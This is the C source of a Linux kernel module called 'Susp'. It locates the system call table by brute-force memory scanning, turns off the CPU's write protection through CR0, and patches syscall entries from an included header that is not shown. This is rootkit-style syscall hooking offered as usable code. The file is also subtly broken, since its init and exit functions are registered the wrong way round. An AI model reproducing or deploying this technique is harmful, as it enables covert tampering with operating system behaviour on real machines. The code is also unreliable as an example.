#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/preempt.h>
#include <linux/syscalls.h>
#include <linux/delay.h>
#include <asm/paravirt.h>
#include <linux/slab.h>
#include <linux/stop_machine.h>
#include "headers/def.h"

void **laid_sc_table = NULL;
unsigned long **sys_call_table;
unsigned long original_cr0;

#include "headers/susp_header.h"
#include "headers/susp_versa.h"

static unsigned long **aquire_sys_call_table(void) {
    unsigned long int offset = PAGE_OFFSET;
    unsigned long **sct;

    while (offset < ULLONG_MAX) {
        sct = (unsigned long **)offset;

        if (sct[__NR_close] == (unsigned long *) sys_close) 
            return sct;

        offset += sizeof(void *);
    }

    return NULL;
}

static int __init susp_load(void) {
    printk(KERN_INFO "[Susp] Loaded");
    
    if(!(sys_call_table = aquire_sys_call_table())) {
        printk(KERN_INFO "[Susp] syscall-table error");
        return -1;
    }

    laid_sc_table = kmalloc(200 * sizeof (unsigned long *), GFP_KERNEL);
    if (! laid_sc_table) {
        printk(KERN_INFO "[Susp] kmalloc error");
        return -1;
    }
    preempt_disable();
    original_cr0 = read_cr0();
    write_cr0(original_cr0 & ~0x00010000);
    #include "headers/sct_header.h"
    write_cr0(original_cr0);
    preempt_enable();

    return 0;
}

static void __exit susp_unload(void) {
    printk(KERN_INFO "[Susp] Unloaded");

    if(!sys_call_table)
        return;
    preempt_disable();
    write_cr0(original_cr0 & ~0x00010000);

    stop_machine(restore_sc_table, NULL, NULL);

    write_cr0(original_cr0);
    preempt_enable();

    msleep(1000);
}

module_init(susp_unload);
module_exit(susp_load);

MODULE_LICENSE("GPL");
